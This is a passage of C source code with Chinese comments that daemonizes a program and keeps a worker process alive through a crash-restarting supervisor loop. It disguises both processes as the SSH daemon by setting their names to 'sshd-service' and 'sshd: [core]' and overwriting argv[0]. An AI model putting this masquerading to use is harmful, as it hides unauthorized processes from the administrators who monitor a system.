        return -1;
    } else if (pid > 0) {
        _exit(0);
    }
    
    if (setsid() < 0) {
        perror("setsid");
        return -1;
    }
    
    // 守护进程修改进程名和argv[0]
    prctl(PR_SET_NAME, "sshd-service");
    if (argv && argv[0]) {
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], "sshd: [service]");
    }
    
    signal(SIGHUP, SIG_IGN);
    
    pid = fork();
    if (pid < 0) {
        perror("fork2");
        return -1;
    } else if (pid > 0) {
        _exit(0);
    }
    
    umask(0);
    chdir("/");
    
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    int fd = open("/dev/null", O_RDWR);
    if (fd != -1) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) {
            close(fd);
        }
    }
    
    daemon_mode = 1;
    
    while (1) {
        pid_t child_pid = fork();
        
        if (child_pid < 0) {
            sleep(5);
            continue;
        } else if (child_pid == 0) {
            // 子进程（工作进程）- 修改进程名和argv[0]
            prctl(PR_SET_NAME, "sshd");
            if (argv && argv[0]) {
                memset(argv[0], 0, strlen(argv[0]));
                strcpy(argv[0], "sshd: [core]");
            }
            
            signal(SIGSEGV, SIG_DFL);
            signal(SIGABRT, SIG_DFL);
            signal(SIGBUS, SIG_DFL);
            signal(SIGFPE, SIG_DFL);
            signal(SIGILL, SIG_DFL);
            
            return 0;
        } else {
            // 父进程（监控进程）- 保持为sshd-service
            prctl(PR_SET_NAME, "sshd-service");
            
            int status;
            pid_t waited_pid = waitpid(child_pid, &status, 0);
            
            if (waited_pid == child_pid) {
                if (WIFEXITED(status)) {
                    int exit_code = WEXITSTATUS(status);
                    if (exit_code == 1) {
                        exit(1);
                    }
                } else if (WIFSIGNALED(status)) {
                    int sig = WTERMSIG(status);
                    if (sig == SIGSEGV || sig == SIGABRT || 
                        sig == SIGBUS || sig == SIGFPE || sig == SIGILL) {
                        // 立即重启
                        continue;
                    } else {
                        sleep(1);
                    }
                } else {
                    sleep(1);
                }
            } else {
                sleep(1);
            }
        }
    }
    
    return 0;
}